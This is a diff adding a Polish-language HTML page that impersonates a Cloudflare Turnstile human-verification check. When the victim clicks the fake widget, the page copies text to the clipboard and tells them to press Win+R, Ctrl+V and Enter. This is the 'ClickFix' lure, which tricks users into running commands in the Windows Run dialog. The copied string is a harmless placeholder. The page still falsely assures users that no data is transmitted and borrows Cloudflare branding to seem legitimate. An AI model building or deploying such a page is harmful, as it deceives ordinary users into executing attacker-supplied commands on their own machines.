@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Weryfikacja — Cloudflare</title>
+  <style>
+    :root {
+      --cf-orange: #f6821f;
+      --cf-green: #21c55d;
+      --bg: #e8eaee;
+      --modal-bg: #ffffff;
+      --modal-border: #d1d5db;
+      --text-dark: #1f2328;
+      --text-mid: #4b5563;
+      --text-muted: #9ca3af;
+      --steps-bg: #f3f4f6;
+      --steps-border: #e5e7eb;
+    }
+
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      font-family: 'Trebuchet MS', 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex; align-items: center; justify-content: center;
+      overflow: hidden;
+    }
+
+    /* ─── Background ─── */
+    .bg-grid {
+      position: fixed; inset: 0; pointer-events: none; z-index: 0;
+      background-image:
+        linear-gradient(rgba(0,0,0,0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,0,0,0.04) 1px, transparent 1px);
+      background-size: 40px 40px;
+    }
+
+    .bg-glow {
+      position: fixed; inset: 0; pointer-events: none; z-index: 0;
+      background:
+        radial-gradient(ellipse 55% 45% at 15% 85%, rgba(246,130,31,0.07) 0%, transparent 65%),
+        radial-gradient(ellipse 45% 40% at 85% 15%, rgba(33,197,93,0.05) 0%, transparent 60%);
+    }
+
+    /* ─── Fake blurred website ─── */
+    .fake-site {
+      position: fixed; inset: 0; z-index: 1; pointer-events: none;
+      padding: 40px 60px;
+      filter: blur(4px) saturate(0.5);
+      opacity: 0.25;
+    }
+    .fake-nav {
+      display: flex; align-items: center; justify-content: space-between;
+      border-bottom: 1px solid #ccd; padding-bottom: 16px; margin-bottom: 40px;
+    }
+    .fake-logo { width: 120px; height: 26px; background: linear-gradient(90deg,#f6821f,#ff9a45); border-radius: 4px; }
+    .fake-nav-links { display: flex; gap: 32px; }
+    .fake-nav-link { width: 60px; height: 11px; background: #bbc; border-radius: 6px; }
+    .fake-h1 { width: 400px; height: 38px; background: #aab; border-radius: 6px; margin-bottom: 14px; }
+    .fake-p { width: 320px; height: 13px; background: #ccd; border-radius: 6px; margin-bottom: 8px; }
+    .fake-p.short { width: 200px; }
+    .fake-cards { display: flex; gap: 20px; margin-top: 48px; }
+    .fake-card { flex:1; height: 140px; background: #fff; border: 1px solid #dde; border-radius: 10px; }
+
+    /* ─── Overlay ─── */
+    .overlay {
+      position: fixed; inset: 0; z-index: 10;
+      background: rgba(100,110,130,0.45);
+      backdrop-filter: blur(4px);
+      display: flex; align-items: center; justify-content: center;
+    }
+
+    /* ─── Modal ─── */
+    .modal {
+      position: relative; z-index: 20;
+      background: var(--modal-bg);
+      border: 1px solid var(--modal-border);
+      border-radius: 18px;
+      padding: 36px 32px 28px;
+      width: 430px;
+      box-shadow:
+        0 1px 0 rgba(255,255,255,0.9) inset,
+        0 20px 60px rgba(0,0,0,0.14),
+        0 4px 16px rgba(0,0,0,0.08);
+      animation: modalIn 0.5s cubic-bezier(0.22,1,0.36,1) both;
+    }
+    @keyframes modalIn {
+      from { opacity:0; transform: scale(0.9) translateY(24px); }
+      to   { opacity:1; transform: scale(1) translateY(0); }
+    }
+
+    /* top orange accent */
+    .modal::before {
+      content: '';
+      position: absolute; top: 0; left: 40px; right: 40px; height: 2px;
+      background: linear-gradient(90deg, transparent, #f6821f 40%, transparent);
+      border-radius: 999px;
+    }
+
+    .modal-close {
+      position: absolute; top: 14px; right: 14px;
+      width: 28px; height: 28px;
+      border: 1px solid #e5e7eb; border-radius: 50%;
+      background: #f9fafb; color: #9ca3af;
+      font-size: 15px; cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      transition: all 0.18s ease; outline: none;
+    }
+    .modal-close:hover { background: #f3f4f6; color: #374151; border-color: #d1d5db; }
+
+    /* ─── Header ─── */
+    .modal-header { text-align: center; margin-bottom: 26px; }
+
+    .shield-wrap {
+      width: 52px; height: 52px; border-radius: 50%;
+      background: rgba(246,130,31,0.08);
+      border: 1.5px solid rgba(246,130,31,0.22);
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 14px;
+    }
+
+    .modal-title {
+      font-size: 19px; font-weight: 700; color: var(--text-dark);
+      letter-spacing: -0.3px; margin-bottom: 5px;
+    }
+    .modal-sub { font-size: 13px; color: var(--text-muted); line-height: 1.5; }
+
+    /* ─── Cloudflare Widget ─── */
+    .cf-widget {
+      background: #fff;
+      border: 1.5px solid #e3e5ea;
+      border-radius: 8px;
+      padding: 13px 14px;
+      display: flex; align-items: center; justify-content: space-between;
+      cursor: pointer; position: relative; overflow: hidden;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      user-select: none;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+    }
+    .cf-widget:hover:not(.done) { border-color: #c5c8ce; box-shadow: 0 2px 10px rgba(0,0,0,0.09); }
+    .cf-widget.done { cursor: default; border-color: #86efac; box-shadow: 0 0 0 3px rgba(33,197,93,0.1); }
+
+    .cf-bar {
+      position: absolute; bottom: 0; left: 0; height: 2px;
+      background: linear-gradient(90deg, #f6821f, #ffb050);
+      width: 0; transition: width 2.4s cubic-bezier(0.4,0,0.2,1);
+    }
+    .cf-bar.run { width: 100%; }
+
+    .cf-left { display: flex; align-items: center; gap: 12px; }
+
+    .cf-box {
+      width: 26px; height: 26px; flex-shrink: 0;
+      border: 2px solid #bdc1c9; border-radius: 4px; background: #fff;
+      display: flex; align-items: center; justify-content: center;
+      transition: border-color 0.2s, background 0.2s; position: relative;
+    }
+    .cf-box.loading { border-color: #f6821f; }
+    .cf-box.verified { border-color: var(--cf-green); background: var(--cf-green); }
+
+    .cf-spinner {
+      display: none; width: 14px; height: 14px;
+      border: 2px solid rgba(246,130,31,0.2);
+      border-top-color: #f6821f; border-radius: 50%;
+      animation: spin 0.75s linear infinite;
+    }
+    .cf-box.loading .cf-spinner { display: block; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .cf-check { display: none; }
+    .cf-box.verified .cf-check {
+      display: block;
+      animation: checkPop 0.35s cubic-bezier(0.34,1.56,0.64,1) both;
+    }
+    @keyframes checkPop { from { transform: scale(0) rotate(-15deg); } to { transform: scale(1) rotate(0); } }
+
+    .cf-label {
+      font-size: 14px; font-weight: 500; color: #1f2328;
+    }
+    .cf-label.ok { color: #15803d; }
+
+    .cf-brand { display: flex; flex-direction: column; align-items: center; gap: 2px; flex-shrink: 0; }
+    .cf-brand-name { font-size: 8.5px; font-weight: 700; letter-spacing: 0.7px; color: #adb5bd; text-transform: uppercase; }
+
+    /* ─── Widget footer links ─── */
+    .cf-links {
+      margin-top: 6px;
+      display: flex; justify-content: space-between; padding: 0 1px;
+    }
+    .cf-link-group { display: flex; gap: 10px; }
+    .cf-link { font-size: 10.5px; color: var(--text-muted); text-decoration: none; }
+    .cf-link:hover { color: var(--cf-orange); }
+    .cf-powered { font-size: 10.5px; color: var(--text-muted); }
+
+    /* ─── Steps section (outside widget) ─── */
+    .steps-section {
+      margin-top: 16px;
+      background: var(--steps-bg);
+      border: 1px solid var(--steps-border);
+      border-radius: 10px;
+      padding: 14px 16px;
+      display: none;
+      animation: fadeUp 0.35s ease both;
+    }
+    .steps-section.show { display: block; }
+    .steps-title {
+      font-size: 11px; font-weight: 600; color: var(--text-muted);
+      text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 10px;
+    }
+    .steps-list { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+    .steps-list li {
+      display: flex; align-items: center; gap: 10px;
+      font-size: 13px; color: var(--text-mid); line-height: 1.4;
+      transition: color 0.3s ease;
+    }
+    .win-key {
+      display: inline-flex; align-items: center; justify-content: center;
+      padding: 2px 5px 3px;
+      background: #f3f4f6;
+      border: 1px solid #d1d5db;
+      border-bottom: 2px solid #b0b7c3;
+      border-radius: 4px;
+      font-size: 0; line-height: 1;
+      vertical-align: middle;
+      box-shadow: 0 1px 0 #9ca3af;
+      margin: 0 2px;
+    }
+    .win-key svg rect { fill: #4b5563; }
+
+    .steps-list li .snum {
+      display: inline-flex; align-items: center; justify-content: center;
+      width: 20px; height: 20px; flex-shrink: 0;
+      border-radius: 50%; font-size: 10px; font-weight: 700;
+      background: #e5e7eb; color: #9ca3af;
+      transition: background 0.3s ease, color 0.3s ease;
+    }
+    .steps-list li.s-done .snum { background: rgba(33,197,93,0.15); color: #21c55d; }
+
+    /* ─── Scanning overlay ─── */
+    .cf-scan {
+      position: absolute; inset: 0; pointer-events: none; overflow: hidden;
+      border-radius: 7px; opacity: 0; transition: opacity 0.3s ease;
+    }
+    .cf-scan.active { opacity: 1; }
+    .cf-scan::after {
+      content: '';
+      position: absolute; left: 0; right: 0; height: 2px;
+      background: linear-gradient(90deg, transparent, rgba(246,130,31,0.6), transparent);
+      animation: scan 1.2s ease-in-out infinite;
+    }
+    @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+    /* ─── Success ─── */
+    .success {
+      margin-top: 14px;
+      background: #f0fdf4; border: 1px solid #bbf7d0;
+      border-radius: 8px; padding: 12px 14px;
+      display: none; align-items: center; gap: 10px;
+      animation: fadeUp 0.4s ease both;
+    }
+    .success.show { display: flex; }
+    @keyframes fadeUp { from { opacity:0; transform: translateY(6px); } to { opacity:1; transform: translateY(0); } }
+    .success-icon {
+      width: 26px; height: 26px; border-radius: 50%;
+      background: rgba(33,197,93,0.15);
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .success-text p:first-child { font-size: 13px; font-weight: 600; color: #15803d; }
+    .success-text p:last-child  { font-size: 11.5px; color: #86efac; margin-top: 1px; }
+
+    /* ─── Footer note ─── */
+    .modal-note {
+      margin-top: 18px; text-align: center;
+      font-size: 11.5px; color: var(--text-muted); line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="bg-glow"></div>
+
+<!-- Fake blurred website -->
+<div class="fake-site">
+  <div class="fake-nav">
+    <div class="fake-logo"></div>
+    <div class="fake-nav-links">
+      <div class="fake-nav-link"></div>
+      <div class="fake-nav-link"></div>
+      <div class="fake-nav-link"></div>
+      <div class="fake-nav-link"></div>
+    </div>
+  </div>
+  <div class="fake-h1"></div>
+  <div class="fake-p"></div>
+  <div class="fake-p short"></div>
+  <div class="fake-cards">
+    <div class="fake-card"></div>
+    <div class="fake-card"></div>
+    <div class="fake-card"></div>
+  </div>
+</div>
+
+<!-- Overlay + Modal -->
+<div class="overlay" id="overlay">
+  <div class="modal" role="dialog" aria-modal="true">
+
+    <button class="modal-close" onclick="closeModal()" aria-label="Zamknij">✕</button>
+
+    <!-- Header -->
+    <div class="modal-header">
+      <div class="shield-wrap">
+        <svg width="24" height="26" viewBox="0 0 26 28" fill="none">
+          <path d="M13 1L2 5.5V13c0 6.6 4.7 12.8 11 14.4C19.3 25.8 24 19.6 24 13V5.5L13 1Z"
+                fill="rgba(246,130,31,0.12)" stroke="#f6821f" stroke-width="1.5" stroke-linejoin="round"/>
+          <path d="M8 14l3.5 3.5L18 10" stroke="#f6821f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1 class="modal-title">Weryfikacja bezpieczeństwa</h1>
+      <p class="modal-sub">Zanim uzyskasz dostęp do tej strony,<br>potwierdź, że nie jesteś botem.</p>
+    </div>
+
+    <!-- Cloudflare Turnstile Widget -->
+    <div class="cf-widget" id="cfWidget" onclick="startVerify()" tabindex="0" role="button">
+      <div class="cf-scan" id="cfScan"></div>
+      <div class="cf-bar" id="cfBar"></div>
+
+      <div class="cf-left">
+        <div class="cf-box" id="cfBox">
+          <div class="cf-spinner"></div>
+          <svg class="cf-check" width="14" height="14" viewBox="0 0 14 14" fill="none">
+            <path d="M2.5 7.5L5.5 10.5L11.5 4" stroke="white" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <span class="cf-label" id="cfLabel">Nie jestem robotem</span>
+      </div>
+
+      <div class="cf-brand">
+        <svg width="46" height="28" viewBox="0 0 109 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M82.3 20.6c-.5-7.3-6.6-13-14-13-5.4 0-10.1 3-12.6 7.5-.9-.4-1.9-.6-3-.6-4 0-7.3 3-7.7 6.8C41.5 22 38 25.8 38 30.4c0 5 4 9 9 9h36c4.8 0 8.7-3.9 8.7-8.7 0-4.6-3.6-8.4-8.2-9H84c-.6 0-1.1-.4-1.2-1-.2-.3-.4-.7-.5-1.1z" fill="#F6821F"/>
+          <text x="2" y="48" font-family="Arial,sans-serif" font-size="10" font-weight="700" fill="#F6821F" letter-spacing="0.8">CLOUDFLARE</text>
+        </svg>
+        <span class="cf-brand-name">Turnstile</span>
+      </div>
+    </div>
+
+    <div class="cf-links">
+      <div class="cf-link-group">
+        <a class="cf-link" href="#">Prywatność</a>
+        <a class="cf-link" href="#">Warunki</a>
+      </div>
+      <span class="cf-powered">Chronione przez Cloudflare</span>
+    </div>
+
+    <!-- Steps — poza widgetem, ukryte do kliknięcia -->
+    <div class="steps-section" id="stepsSection">
+      <p class="steps-title">Proces weryfikacji...</p>
+      <ol class="steps-list">
+        <li id="step1" class="s-active">
+          <span class="snum">1</span>
+          <span class="stext">Kliknij przycisk <kbd class="win-key"><svg width="11" height="11" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="0.5" y="0.5" width="5" height="5" rx="0.5" fill="#555"/><rect x="6.5" y="0.5" width="5" height="5" rx="0.5" fill="#555"/><rect x="0.5" y="6.5" width="5" height="5" rx="0.5" fill="#555"/><rect x="6.5" y="6.5" width="5" height="5" rx="0.5" fill="#555"/></svg></kbd> + R</span>
+        </li>
+        <li id="step2">
+          <span class="snum">2</span>
+          <span class="stext">Naciśnij klawisze CTRL + V</span>
+        </li>
+        <li id="step3">
+          <span class="snum">3</span>
+          <span class="stext">Naciśnij ENTER</span>
+        </li>
+      </ol>
+    </div>
+
+    <!-- Success -->
+    <!-- <div class="success" id="successBox">
+      <div class="success-icon">
+        <svg width="13" height="13" viewBox="0 0 13 13" fill="none">
+          <path d="M2 6.5L5 9.5L11 3.5" stroke="#21c55d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <div class="success-text">
+        <p>Weryfikacja zakończona</p>
+        <p>Przekierowywanie na stronę…</p>
+      </div>
+    </div> -->
+
+    <p class="modal-note">
+      Ta weryfikacja chroni stronę przed złośliwym ruchem.<br>
+      Twoje dane nie są przesyłane ani przechowywane.
+    </p>
+
+  </div>
+</div>
+
+<script>
+  let busy = false;
+
+  function startVerify() {
+    if (busy) return;
+    busy = true;
+
+    const box    = document.getElementById('cfBox');
+    const label  = document.getElementById('cfLabel');
+    const bar    = document.getElementById('cfBar');
+    const scan   = document.getElementById('cfScan');
+    const widget = document.getElementById('cfWidget');
+    const s1 = document.getElementById('step1');
+    const s2 = document.getElementById('step2');
+    const s3 = document.getElementById('step3');
+
+    // kopiuj do schowka
+    navigator.clipboard.writeText('ALA_MA_KOTA_A_KOT_MA_ALE').catch(() => {});
+
+    // pokaż instrukcję
+    document.getElementById('stepsSection').classList.add('show');
+
+    // step 1 done → step 2 active
+    s1.classList.remove('s-active');
+    s1.classList.add('s-done');
+    s1.querySelector('.snum').textContent = '✓';
+    s2.classList.add('s-active');
+
+    box.classList.add('loading');
+    label.textContent = 'Weryfikacja…';
+    scan.classList.add('active');
+    requestAnimationFrame(() => bar.classList.add('run'));
+
+    setTimeout(() => {
+      scan.classList.remove('active');
+      box.classList.remove('loading');
+      box.classList.add('verified');
+      label.textContent = 'Zweryfikowano';
+      label.classList.add('ok');
+      widget.classList.add('done');
+      widget.onclick = null;
+      widget.tabIndex = -1;
+
+      // step 2 done → step 3 active → done
+      s2.classList.remove('s-active');
+      s2.classList.add('s-done');
+      s2.querySelector('.snum').textContent = '✓';
+      s3.classList.add('s-active');
+
+      setTimeout(() => {
+        s3.classList.remove('s-active');
+        s3.classList.add('s-done');
+        s3.querySelector('.snum').textContent = '✓';
+      }, 450);
+
+      setTimeout(() => document.getElementById('successBox').classList.add('show'), 350);
+
+    }, 1222500);
+  }
+
+  document.getElementById('cfWidget').addEventListener('keydown', e => {
+    if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); startVerify(); }
+  });
+
+  function closeModal() {
+    const o = document.getElementById('overlay');
+    o.style.transition = 'opacity 0.3s ease';
+    o.style.opacity = '0';
+    o.style.pointerEvents = 'none';
+  }
+
+  document.getElementById('overlay').addEventListener('click', function(e) {
+    if (e.target === this) closeModal();
+  });
+</script>
+</body>
+</html>
